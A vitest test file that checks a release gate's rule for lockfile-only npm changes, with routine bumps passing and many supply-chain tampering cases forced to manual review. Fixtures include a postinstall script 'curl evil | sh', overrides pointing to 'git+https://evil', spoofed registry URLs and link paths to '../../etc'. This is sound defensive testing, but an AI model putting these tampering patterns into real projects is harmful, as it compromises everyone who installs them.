/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unsafe-call -- the tests build and break plain CloudFormation JSON at a path, which a typed document would not allow */
// Rule J (plan v3 section 9 (b)): a lockfile-only change. The 12 attack tests (each MUST give MANUAL), more attacks, and the positives.
import { describe, expect, it } from "vitest";
import { SHA512, auto, changesOf, cloudInput, codeInput, hex, row, SL, TREE } from "./fixtures-index.ts";
import { attack, manual } from "./helpers.ts";
import { cloneDeep } from "./clone.ts";

type Obj = Record<string, any>;
const REG = "https://registry.npmjs.org";

function baseLock(): Obj {
  return {
    name: "agentx",
    version: "0.1.0",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": { name: "agentx", version: "0.1.0", workspaces: ["packages/*", "infra"], devDependencies: { vitest: "5.0.3" } },
      "packages/a": { name: "@agentx/a", version: "1.0.0", dependencies: { leftpad: "^1.0.0" } },
      "node_modules/@agentx/a": { resolved: "packages/a", link: true },
      "node_modules/leftpad": { version: "1.0.0", resolved: `${REG}/leftpad/-/leftpad-1.0.0.tgz`, integrity: SHA512 },
      "node_modules/vitest": { version: "5.0.3", resolved: `${REG}/vitest/-/vitest-5.0.3.tgz`, integrity: SHA512, bin: { vitest: "vitest.mjs" } },
    },
  };
}

/** A lock-only release: the routine code input plus package-lock.json changed, new lock produced by `bump`. */
function lockInput(bump: (lock: Obj) => void = (l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: SHA512 }; }, extraPaths: string[] = []): Obj {
  const input = codeInput();
  const oldLock = baseLock();
  const newLock = baseLock();
  bump(newLock);
  input.changedPaths = ["package-lock.json", ...extraPaths];
  input.lock = { old: JSON.stringify(oldLock), new: JSON.stringify(newLock) };
  input.npmCiDryRun = { ok: true };
  return input;
}
const lockAttack = (bump: (lock: Obj) => void, extraPaths: string[] = [], code?: string, rule = "J"): void => {
  const input = lockInput(bump, extraPaths);
  manual(input, code, rule);
};
const pkg = (lock: Obj, name: string): Obj => lock.packages[`node_modules/${name}`];

describe("J positive", () => {
  it("a registry-only, sha512, no-install-script bump with CI green and routine rows is AUTO", () => auto(lockInput()));
  it("a new transitive package without a bin or install script is AUTO", () => auto(lockInput((l) => { l.packages["node_modules/tiny"] = { version: "1.0.0", resolved: `${REG}/tiny/-/tiny-1.0.0.tgz`, integrity: SHA512 }; })));
  it("a scoped package bump is AUTO", () => auto(lockInput((l) => { l.packages["node_modules/@scope/pkg"] = { version: "2.0.0", resolved: `${REG}/@scope/pkg/-/pkg-2.0.0.tgz`, integrity: SHA512 }; })));
  it("a bump that keeps the same bin names is AUTO", () => auto(lockInput((l) => { l.packages["node_modules/vitest"] = { version: "5.0.4", resolved: `${REG}/vitest/-/vitest-5.0.4.tgz`, integrity: SHA512, bin: { vitest: "vitest.mjs" } }; })));
  it("hasInstallScript explicitly false is fine", () => auto(lockInput((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: SHA512, hasInstallScript: false }; })));
  it("a removed package nobody declares is AUTO", () => {
    const i = lockInput(() => undefined);
    const oldLock = baseLock();
    oldLock.packages["node_modules/orphan"] = { version: "1.0.0", resolved: `${REG}/orphan/-/orphan-1.0.0.tgz`, integrity: SHA512 };
    i.lock.old = JSON.stringify(oldLock);
    auto(i);
  });
  it("the lock path alone with no change in the lock is AUTO", () => auto(lockInput(() => undefined)));
});

describe("J attacks (the plan's 12; each MUST give MANUAL)", () => {
  it("1. lock bump plus a package.json scripts.postinstall change", () => lockAttack(() => undefined, ["package.json"], "lockfile"));
  it("1b. in a workspace package.json", () => lockAttack(() => undefined, ["packages/a/package.json"], "lockfile"));
  it("2. lock-only bump of a package whose new version has hasInstallScript", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: SHA512, hasInstallScript: true }; }, [], "lockfile"));
  it("3. a new transitive package with hasInstallScript", () => lockAttack((l) => { l.packages["node_modules/evil-dep"] = { version: "1.0.0", resolved: `${REG}/evil-dep/-/evil-dep-1.0.0.tgz`, integrity: SHA512, hasInstallScript: true }; }, [], "lockfile"));
  for (const [name, resolved] of [
    ["another host", "https://evil.example/leftpad-1.0.1.tgz"],
    ["git+https", "git+https://github.com/x/leftpad.git#abc"],
    ["http (not https)", "http://registry.npmjs.org/leftpad/-/leftpad-1.0.1.tgz"],
    ["file:", "file:../x"],
    ["link:", "link:../x"],
    ["a host that starts with the registry host", "https://registry.npmjs.org.evil.example/leftpad.tgz"],
    ["user info before the host", "https://registry.npmjs.org@evil.example/leftpad.tgz"],
    ["a different port", "https://registry.npmjs.org:8443/leftpad.tgz"],
    ["credentials", "https://user:pw@registry.npmjs.org/leftpad.tgz"],
    ["another registry", "https://registry.yarnpkg.com/leftpad/-/leftpad-1.0.1.tgz"],
    ["a github tarball", "https://codeload.github.com/x/y/tar.gz/abc"],
    ["an empty string", ""],
    ["not a URL", "leftpad"],
  ] as const) {
    it(`4. resolved is ${name}`, () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved, integrity: SHA512 }; }, [], "lockfile"));
  }
  it("4. resolved missing", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", integrity: SHA512 }; }, [], "lockfile"));
  it("5. a sha1 integrity", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: "sha1-AAAAAAAAAAAAAAAAAAAAAAAAAAA=" }; }, [], "lockfile"));
  it("5. no integrity", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz` }; }, [], "lockfile"));
  it("5. a sha512 prefix with a short body", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: "sha512-abc" }; }, [], "lockfile"));
  it("5. a sha256 integrity", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: `sha256-${"A".repeat(43)}=` }; }, [], "lockfile"));
  it("6. lockfileVersion 3 to 2", () => lockAttack((l) => { l.lockfileVersion = 2; }, [], "lockfile"));
  it("6b. lockfileVersion 3 to 4", () => lockAttack((l) => { l.lockfileVersion = 4; }, [], "lockfile"));
  it("7. root packages[''].dependencies edited in the lock only", () => lockAttack((l) => { l.packages[""].dependencies = { evil: "^1.0.0" }; }, [], "lockfile"));
  it("7b. root devDependencies range edited", () => lockAttack((l) => { l.packages[""].devDependencies = { vitest: "^5" }; }, [], "lockfile"));
  it("7c. root scripts added in the lock only", () => lockAttack((l) => { l.packages[""].scripts = { postinstall: "curl evil | sh" }; }, [], "lockfile"));
  it("7d. root workspaces edited", () => lockAttack((l) => { l.packages[""].workspaces = ["packages/*", "infra", "evil"]; }, [], "lockfile"));
  it("7e. root overrides edited", () => lockAttack((l) => { l.packages[""].overrides = { leftpad: "git+https://evil" }; }, [], "lockfile"));
  it("8. a new bin on an existing package", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: SHA512, bin: { leftpad: "cli.js" } }; }, [], "lockfile"));
  it("8b. an extra bin name next to an existing one", () => lockAttack((l) => { pkg(l, "vitest").bin = { vitest: "vitest.mjs", evil: "evil.js" }; pkg(l, "vitest").version = "5.0.4"; }, [], "lockfile"));
  it("8c. an existing bin pointing somewhere else", () => lockAttack((l) => { pkg(l, "vitest").bin = { vitest: "evil.js" }; pkg(l, "vitest").version = "5.0.4"; }, [], "lockfile"));
  it("8d. a new package with a bin", () => lockAttack((l) => { l.packages["node_modules/clitool"] = { version: "1.0.0", resolved: `${REG}/clitool/-/clitool-1.0.0.tgz`, integrity: SHA512, bin: { clitool: "cli.js" } }; }, [], "lockfile"));
  it("9. a lock plus a .npmrc adding a registry", () => lockAttack(() => undefined, [".npmrc"], "lockfile"));
  it("9b. a .yarnrc.yml", () => lockAttack(() => undefined, [".yarnrc.yml"], "lockfile"));
  it("10. a lock plus a Dockerfile change", () => lockAttack(() => undefined, ["environments/base/Dockerfile"], "lockfile"));
  it("10b. a lock plus a release script", () => lockAttack(() => undefined, ["scripts/release-production.ts"], "lockfile"));
  it("10c. a lock plus .node-version", () => lockAttack(() => undefined, [".node-version"], "lockfile"));
  it("11. a lock change whose rows include an IAM row", () => { const i = lockInput(); changesOf(i, SL).push(row("RoleX", "AWS::IAM::Role", "Modify", "False", ["Properties"], [])); manual(i, "row-rejected", "G"); });
  it("11b. a lock change whose rows include an Add row", () => { const i = lockInput(); changesOf(i, SL).push(row("Extra", "AWS::SQS::Queue", "Add", null, [], [])); manual(i, "row-rejected", "G"); });
  it("12. a lock change with CI on a different tree", () => { const i = lockInput(); i.ci.runs[0].head_commit.tree_id = hex("9"); manual(i, "ci-not-green", "C"); });
  it("12b. a lock change with no CI run", () => { const i = lockInput(); i.ci.runs = []; manual(i, "ci-missing", "C"); });
});

describe("J more attacks", () => {
  it("npm ci --dry-run failed in Build", () => { const i = lockInput(); i.npmCiDryRun = { ok: false }; manual(i, "lockfile", "J"); });
  it("npm ci --dry-run result missing", () => { const i = lockInput(); delete i.npmCiDryRun; manual(i, "input-missing"); });
  it("the lock input missing while package-lock.json changed", () => { const i = lockInput(); delete i.lock; manual(i, "input-missing"); });
  it("an unparsable new lock", () => { const i = lockInput(); i.lock.new = "{"; manual(i, "parse-error"); });
  it("an unknown top-level key in a lock", () => { const i = lockInput((l) => { l.dependencies = { evil: {} }; }); manual(i, "unknown-field"); });
  it("the top-level name or version changed", () => lockAttack((l) => { l.version = "9.9.9"; }, [], "lockfile"));
  it("a removed entry a workspace still names", () => lockAttack((l) => { delete l.packages["node_modules/leftpad"]; }, [], "lockfile"));
  it("a removed entry the root still names", () => lockAttack((l) => { delete l.packages["node_modules/vitest"]; }, [], "lockfile"));
  it("a changed workspace entry (a manifest-level change)", () => lockAttack((l) => { l.packages["packages/a"].dependencies = { leftpad: "^2.0.0", evil: "1" }; }, [], "lockfile"));
  it("a removed workspace entry", () => lockAttack((l) => { delete l.packages["packages/a"]; }, [], "lockfile"));
  it("the set of workspace links changed", () => lockAttack((l) => { l.packages["node_modules/@agentx/b"] = { resolved: "packages/b", link: true }; }, [], "lockfile"));
  it("a link entry added outside the workspaces", () => lockAttack((l) => { l.packages["node_modules/evil"] = { resolved: "../../etc", link: true }; }, [], "lockfile"));
  it("an install script flagged as a string", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = { version: "1.0.1", resolved: `${REG}/leftpad/-/leftpad-1.0.1.tgz`, integrity: SHA512, hasInstallScript: "true" }; }, [], "lockfile"));
  it("a changed entry that is not an object", () => lockAttack((l) => { l.packages["node_modules/leftpad"] = "evil"; }, [], "lockfile"));
  it("a non-root lock path (workspace lockfile) is a manual path", () => { const i = lockInput(); i.changedPaths.push("packages/a/package-lock.json"); manual(i, "manual-path", "D"); });
  it("package-lock.json alone never needs J when it did not change", () => auto(codeInput()));
  it("the cloud pipeline applies rule J as well", () => { const i = cloudInput(); i.changedPaths = ["package-lock.json"]; const o = baseLock(); const n = baseLock(); n.lockfileVersion = 2; i.lock = { old: JSON.stringify(o), new: JSON.stringify(n) }; i.npmCiDryRun = { ok: true }; manual(i, "lockfile", "J"); });
  it("an input with a lock but no package-lock.json change ignores the lock", () => { const i = codeInput(); i.lock = { old: "x", new: "y" }; auto(i); });
});

void [attack, cloneDeep, TREE];
void expect;
